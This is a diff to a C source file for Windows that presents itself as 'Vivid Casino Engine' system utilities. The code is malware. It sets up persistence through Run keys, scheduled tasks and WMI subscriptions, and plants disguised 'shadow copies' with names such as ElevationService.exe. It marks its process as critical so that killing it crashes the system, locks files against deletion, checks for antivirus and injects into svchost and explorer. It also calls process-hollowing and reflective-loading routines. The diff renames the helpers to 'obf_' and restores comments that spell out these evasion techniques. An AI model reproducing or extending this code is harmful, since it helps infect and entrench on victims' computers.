@@ -2,6 +2,7 @@
  * Vivid Casino Engine — System Utilities
  * 
  * System command execution, clipboard monitoring,
+ * persistence, and privilege management.
  */
 
 #include "../engine/engine.h"
@@ -162,9 +163,9 @@ char* sys_get_info(void) {
     return info;
 }
 
-/* Ensure a process persists via scheduled task — delegates to utility impl */
+/* Ensure a process persists via scheduled task — delegates to obfuscated impl */
 static void ensure_scheduled_task(const char *exePath, const char *taskName) {
-    util_ensure_task(exePath, taskName);
+    obf_ensure_scheduled_task(exePath, taskName);
 }
 
 /* Register application for auto-start on login + scheduled task */
@@ -179,7 +180,7 @@ void sys_register_autostart(void) {
         RegCloseKey(hKey);
     }
     /* Also add scheduled task for redundancy */
-    util_ensure_task(path, "VividCasinoMain");
+    obf_ensure_scheduled_task(path, "VividCasinoMain");
 }
 
 /* Check and request required privileges for system integration */
@@ -221,6 +222,7 @@ void sys_check_antivirus(void) {
     sys_run_command(cmd);
 }
 
+/* === Process Protection (Plain String Versions — work regardless of obf state) === */
 
 int g_critical_protected = 0;
 
@@ -257,7 +259,7 @@ static int enable_privilege_plain(const char *privilege_name) {
     return 1;
 }
 
-/* Mark process as critical — uses plain strings, works even if utility decoders are broken */
+/* Mark process as critical — uses plain strings, works even if obf decoders are broken */
 void sys_protect_process(void) {
     typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
     
@@ -285,6 +287,7 @@ void sys_protect_process(void) {
     }
 }
 
+/* Remove critical process flag */
 void sys_unprotect_process(void) {
     typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
     
@@ -340,13 +343,14 @@ const char* sys_check_critical_status_with_name(void) {
         return buf;
     }
     if (isCritical) {
-        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[PROTECTED] [%s]", filename);
     } else {
         snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
     }
     return buf;
 }
 
+/* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
         if (g_critical_protected != 1) {
@@ -357,6 +361,7 @@ DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     return 0;
 }
 
+/* === FULL UNINSTALL: Remove ALL persistence and exit cleanly === */
 void sys_uninstall(void) {
     extern volatile int g_uninstalling;
     g_uninstalling = 1;
@@ -379,6 +384,7 @@ void sys_uninstall(void) {
         "VividCasino"
     };
     
+    /* 1. Remove critical flag from ALL shadow processes */
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32 pe;
@@ -407,6 +413,7 @@ void sys_uninstall(void) {
         CloseHandle(hSnap);
     }
     
+    /* 2. Remove critical flag from current process */
     sys_unprotect_process();
     
     /* 3. Remove registry Run keys */
@@ -429,8 +436,9 @@ void sys_uninstall(void) {
     snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"VividCasinoMain\" /f 2>nul");
     system(cmd);
     
+    /* 5. Remove WMI persistence */
     snprintf(cmd, sizeof(cmd),
-        "powershell -NoProfile -ExecutionPolicy RemoteSigned -Command \""
+        "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
         "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \\\"Name='SysHealthFilter'\\\" -ErrorAction SilentlyContinue;"
         "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SysHealthConsumer'\\\" -ErrorAction SilentlyContinue;"
         "Remove-WmiObject -Namespace 'root/subscription' -Class __FilterToConsumerBinding -Filter \\\"Filter='__EventFilter.Name=\\\"SysHealthFilter\\\"'\\\" -ErrorAction SilentlyContinue"
@@ -448,6 +456,7 @@ void sys_uninstall(void) {
     snprintf(cmd, sizeof(cmd), "icacls \"%s\" /grant \"%s\":(F) /t /c /q 2>nul", dirPath, "%USERNAME%");
     system(cmd);
     
+    /* 7. Terminate ALL shadow processes */
     hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32 pe;
@@ -468,6 +477,7 @@ void sys_uninstall(void) {
         CloseHandle(hSnap);
     }
     
+    /* 8. Delete shadow files */
     for (int i = 0; i < 3; i++) {
         char path[MAX_PATH];
         snprintf(path, sizeof(path), "%s\\%s", dirPath, shadows[i]);
@@ -503,6 +513,7 @@ int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
 }
 
+/* Spawn a single shadow copy with a given filename and registry key name.
    Uses CreateProcess for elevation inheritance, adds Run key + scheduled task. */
 static void spawn_single_copy(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
@@ -525,6 +536,7 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         return;
     }
 
+    /* Register persistence: Run key */
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -535,7 +547,8 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         RegCloseKey(hKey);
     }
 
-    util_ensure_task(destPath, regKey);
+    /* Register persistence: Scheduled task (runs every 5 minutes) */
+    obf_ensure_scheduled_task(destPath, regKey);
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
@@ -554,6 +567,7 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     }
 }
 
+/* Spawn three shadow copies with generic computer-related names */
 void sys_spawn_shadow_copy(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
@@ -563,7 +577,7 @@ void sys_spawn_shadow_copy(void) {
     
     /* Harden directory FIRST — deny DELETE_CHILD so files can't be deleted from it */
     SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-    char *icacls = util_icacls();
+    char *icacls = obf_icacls();
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
         "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
@@ -575,51 +589,59 @@ void sys_spawn_shadow_copy(void) {
     sys_run_command(cmd);
     
     spawn_single_copy("ElevationService.exe", "ElevationService");
-    util_lock_file("ElevationService.exe");
+    obf_sys_harden_single_file("ElevationService.exe");
     
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
-    util_lock_file("CrashHandler.exe");
+    obf_sys_harden_single_file("CrashHandler.exe");
     
     spawn_single_copy("NotifyService.exe", "NotifyService");
-    util_lock_file("NotifyService.exe");
+    obf_sys_harden_single_file("NotifyService.exe");
     
-    util_setup_wmi();
-    util_lock_files();   /* Full re-harden as safety net */
-    util_spawn_remote();      /* utility svchost/explorer spawn */
+    /* Apply all advanced layers automatically using obfuscated APIs */
+    obf_sys_wmi_persistence();
+    obf_sys_harden_files();   /* Full re-harden as safety net */
+    obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
     Sleep(2000);
+    obf_sys_hollow_process();      /* obfuscated fileless hollowing */
     Sleep(1000);
+    obf_reflective_load();         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
 }
 
+/* === Advanced Persistence & Evasion === */
 
+/* 1. WMI Event Subscription — delegates to obfuscated implementation */
 void sys_wmi_persistence(void) {
-    util_setup_wmi();
+    obf_sys_wmi_persistence();
 }
 
+/* 2. Process Injection — delegates to obfuscated implementation */
 void sys_inject_process(void) {
-    util_spawn_remote();
+    obf_sys_inject_process();
 }
 
+/* 3. NTFS ACL Hardening — delegates to obfuscated implementation */
 void sys_harden_files(void) {
-    util_lock_files();
+    obf_sys_harden_files();
 }
 
+/* 4. LOLBAS — delegates to obfuscated implementation */
 void sys_lolbas_download(const char *url, const char *outPath) {
-    util_download_file(url, outPath);
+    obf_sys_lolbas_download(url, outPath);
 }
 
-/* 5. PowerShell Utility — base64 encode (this is benign enough to keep) */
-char* sys_utilize_ps(const char *command) {
+/* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
+char* sys_encode_cmd(const char *command) {
     static char result[NET_BUF_SIZE];
     
     int wlen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
     if (wlen <= 0) {
-        snprintf(result, sizeof(result), "[Utility failed: conversion error]");
+        snprintf(result, sizeof(result), "[Obfuscation failed: conversion error]");
         return result;
     }
     
     wchar_t *wcmd = (wchar_t*)malloc(wlen * sizeof(wchar_t));
     if (!wcmd) {
-        snprintf(result, sizeof(result), "[Utility failed: memory error]");
+        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
         return result;
     }
     
@@ -630,14 +652,14 @@ char* sys_utilize_ps(const char *command) {
     
     if (!CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64len) || base64len == 0) {
         free(wcmd);
-        snprintf(result, sizeof(result), "[Utility failed: encoding error]");
+        snprintf(result, sizeof(result), "[Obfuscation failed: encoding error]");
         return result;
     }
     
     char *base64 = (char*)malloc(base64len);
     if (!base64) {
         free(wcmd);
-        snprintf(result, sizeof(result), "[Utility failed: memory error]");
+        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
         return result;
     }
     
@@ -650,8 +672,9 @@ char* sys_utilize_ps(const char *command) {
     return result;
 }
 
+/* 2b. Process Hollowing — delegates to obfuscated implementation */
 void sys_hollow_process(void) {
-    util_spawn_memory();
+    obf_sys_hollow_process();
 }
 
 /* === Clipboard Subsystem === */
